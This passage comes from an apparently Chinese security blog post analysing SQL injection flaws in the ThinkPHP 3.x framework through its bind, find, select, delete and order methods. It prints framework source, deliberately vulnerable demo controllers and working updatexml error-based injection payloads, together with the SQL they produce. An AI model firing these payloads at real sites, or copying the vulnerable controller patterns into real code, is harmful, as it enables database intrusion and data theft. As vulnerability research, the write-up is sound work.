class="string">&#x27;comment&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>,!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但由于<code>parseSet</code>在<code>delete</code>方法中不存在,因此这里需要手动添加<code>bind</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>]=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$name</span>))-&gt;<span class="title function_ invoke__">bind</span>(<span class="variable">$data</span>)-&gt;<span class="title function_ invoke__">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 参数绑定</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $key  参数名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value  绑定的变量及绑定参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Model</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span>=<span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;bind&#x27;</span>] =    <span class="variable">$key</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$num</span> =  <span class="title function_ invoke__">func_num_args</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="variable">$params</span> =   <span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line">            <span class="title function_ invoke__">array_shift</span>(<span class="variable">$params</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;bind&#x27;</span>][<span class="variable">$key</span>] =  <span class="variable">$params</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;bind&#x27;</span>][<span class="variable">$key</span>] =  <span class="variable">$value</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>name[]=bind&amp;name[]=password and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p>
<p>thinkphp构造出的sql语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM `user` WHERE `username` = :&#x27;123456&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>实际执行语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM `user` WHERE `username` = &#x27;123456&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201433160.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201406099.png"></p>
<h3 id="find-select-delete-注入"><a href="#find-select-delete-注入" class="headerlink" title="find() select() delete()注入"></a>find() select() delete()注入</h3><p><code>find() select() delete()</code>这三个函数的参数中均有<code>$options</code>,且在满足一定条件时可以直接拼接到sql语句中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $options 表达式参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 总是查找一条记录</span></span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]   =   <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 分析表达式</span></span><br><span class="line">    <span class="variable">$options</span>            =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseOptions</span>(<span class="variable">$options</span>);<span class="comment">//$options可控并传递到$this-&gt;db-&gt;select中</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$resultSet</span>          =   <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$options</span>);<span class="comment">//跟前面的分析过程一样,进入parseWhere,同时因为$options[&#x27;where&#x27;]是字符串,所以直接进行拼接并返回,最终传入到$this-&gt;db-&gt;query中</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询数据集</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $options 表达式参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;<span class="comment">//利用方法同find()</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 分析表达式</span></span><br><span class="line">    <span class="variable">$options</span>    =  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseOptions</span>(<span class="variable">$options</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$resultSet</span>  = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$options</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $options 表达式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 分析表达式</span></span><br><span class="line">    <span class="variable">$options</span> =  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseOptions</span>(<span class="variable">$options</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$pk</span>]))&#123;</span><br><span class="line">        <span class="variable">$pkValue</span>            =  <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$pk</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_before_delete</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;        </span><br><span class="line">    <span class="variable">$result</span>  =    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$options</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;<span class="comment">//当$options[&#x27;where&#x27;]是字符串时,直接返回</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>))</span><br><span class="line">        <span class="variable">$options</span> =  <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;options,<span class="variable">$options</span>);</span><br><span class="line">    <span class="comment">// 字段类型验证</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;model  =   <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseBind</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>]:<span class="keyword">array</span>());</span><br><span class="line">    <span class="variable">$sql</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildSelectSql</span>(<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$result</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>,!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$sql</span>  =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseSql</span>(<span class="variable">$this</span>-&gt;selectSql,<span class="variable">$options</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span>(<span class="params"><span class="variable">$sql</span>,<span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span>   = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">&#x27;%TABLE%&#x27;</span>,<span class="string">&#x27;%DISTINCT%&#x27;</span>,<span class="string">&#x27;%FIELD%&#x27;</span>,<span class="string">&#x27;%JOIN%&#x27;</span>,<span class="string">&#x27;%WHERE%&#x27;</span>,<span class="string">&#x27;%GROUP%&#x27;</span>,<span class="string">&#x27;%HAVING%&#x27;</span>,<span class="string">&#x27;%ORDER%&#x27;</span>,<span class="string">&#x27;%LIMIT%&#x27;</span>,<span class="string">&#x27;%UNION%&#x27;</span>,<span class="string">&#x27;%LOCK%&#x27;</span>,<span class="string">&#x27;%COMMENT%&#x27;</span>,<span class="string">&#x27;%FORCE%&#x27;</span>),</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            ...</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhere</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            ...</span><br><span class="line">        ),<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span>(<span class="params"><span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$whereStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$where</span>)) &#123;</span><br><span class="line">        <span class="comment">// 直接使用字符串条件</span></span><br><span class="line">        <span class="variable">$whereStr</span> = <span class="variable">$where</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable">$whereStr</span>)?<span class="string">&#x27;&#x27;</span>:<span class="string">&#x27; WHERE &#x27;</span>.<span class="variable">$whereStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;model  =   <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseBind</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>]:<span class="keyword">array</span>());</span><br><span class="line">    <span class="variable">$table</span>  =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span>    =   <span class="string">&#x27;DELETE FROM &#x27;</span>.<span class="variable">$table</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$table</span>,<span class="string">&#x27;,&#x27;</span>))&#123;<span class="comment">// 多表删除支持USING和JOIN操作</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;using&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$sql</span> .= <span class="string">&#x27; USING &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;using&#x27;</span>]).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseJoin</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhere</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$table</span>,<span class="string">&#x27;,&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// 单表删除支持order和limit</span></span><br><span class="line">        <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseOrder</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>]:<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseLimit</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> .=   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseComment</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>,!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>find()</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>name[where]=updatexml(1,concat(0x7e,(select @@version),0x7e),1)%23</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201509038.png"></p>
<ol start="2">
<li>select()</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201511956.png"></p>
<ol start="3">
<li>delete()</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201523742.png"></p>
<h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">        <span class="variable">$order</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.order&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">order</span>(<span class="variable">$order</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>thinkphp通过<code>__call</code>方法实现特殊方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用__call方法实现一些特殊的Model方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $method 方法名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $args 调用参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>) 